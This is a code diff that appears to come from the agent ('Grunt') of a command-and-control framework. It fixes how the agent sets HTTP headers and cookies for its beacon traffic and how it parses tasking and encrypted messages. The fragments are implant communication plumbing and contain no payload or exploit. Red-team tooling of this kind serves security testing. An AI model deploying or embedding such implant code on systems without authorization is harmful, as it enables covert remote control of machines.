@@ -549,10 +549,13 @@ namespace BruteExecutor
         {
             for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
             {
-                this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", this.Identifier), ProfileHttpHeaderValues[i].Replace("{GUID}", this.Identifier));
-                if (ProfileHttpHeaderNames[i] == "Cookies")
+                if (ProfileHttpHeaderNames[i] == "Cookie")
                 {
-                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ","));
+                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", this.Identifier));
+                }
+                else
+                {
+                    this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", this.Identifier), ProfileHttpHeaderValues[i].Replace("{GUID}", this.Identifier));
                 }
             }
         }
@@ -647,7 +650,7 @@ namespace BruteExecutor
         private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
         public static GruntTaskingMessage FromJson(string message)
         {
-            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat.Replace("{{", "{").Replace("}}", "}"));
+            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat);
             if (parseList.Count < 3) { return null; }
             return new GruntTaskingMessage
             {
@@ -732,7 +735,7 @@ namespace BruteExecutor
         private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
         public static GruntEncryptedMessage FromJson(string message)
         {
-            List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat.Replace("{{", "{").Replace("}}", "}"));
+            List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);
             if (parseList.Count < 5) { return null; }
             return new GruntEncryptedMessage
             {
@@ -864,7 +867,7 @@ namespace BruteExecutor
 
         public static List<string> Parse(string data, string format)
         {
-            format = Regex.Escape(format).Replace("\\{", "{");
+            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
             if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
             if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
             if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
